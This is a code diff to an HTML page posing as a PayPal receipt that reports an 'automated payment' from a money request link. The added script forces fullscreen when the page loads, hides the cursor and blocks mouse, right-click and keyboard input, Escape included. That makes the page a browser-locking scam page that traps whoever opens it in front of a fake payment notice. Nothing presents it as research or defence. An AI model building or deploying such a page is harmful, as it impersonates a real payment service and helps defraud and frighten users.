@@ -5,15 +5,19 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>PayPal Receipt</title>
 <style>
-  body {
+  html, body {
     margin: 0;
+    padding: 0;
     font-family: Arial, sans-serif;
     background: #0f0f0f;
     color: #fff;
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
+    cursor: none; /* Hide mouse pointer */
   }
 
   .paypal-logo {
@@ -81,6 +85,30 @@
     ⚠ Note: This was an automated payment triggered by clicking a Money Request Link.
   </div>
 </div>
+
+<script>
+// Request fullscreen automatically when page loads
+document.addEventListener("DOMContentLoaded", () => {
+  const el = document.documentElement;
+  if (el.requestFullscreen) {
+    el.requestFullscreen();
+  } else if (el.webkitRequestFullscreen) {
+    el.webkitRequestFullscreen();
+  } else if (el.msRequestFullscreen) {
+    el.msRequestFullscreen();
+  }
+});
+
+// Disable mouse interactions
+window.addEventListener('mousemove', e => e.preventDefault());
+window.addEventListener('mousedown', e => e.preventDefault());
+window.addEventListener('mouseup', e => e.preventDefault());
+window.addEventListener('contextmenu', e => e.preventDefault());
+window.addEventListener('click', e => e.preventDefault());
+
+// Optional: disable keyboard input (Escape, etc.)
+window.addEventListener('keydown', e => e.preventDefault());
+</script>
 
 </body>
 </html>
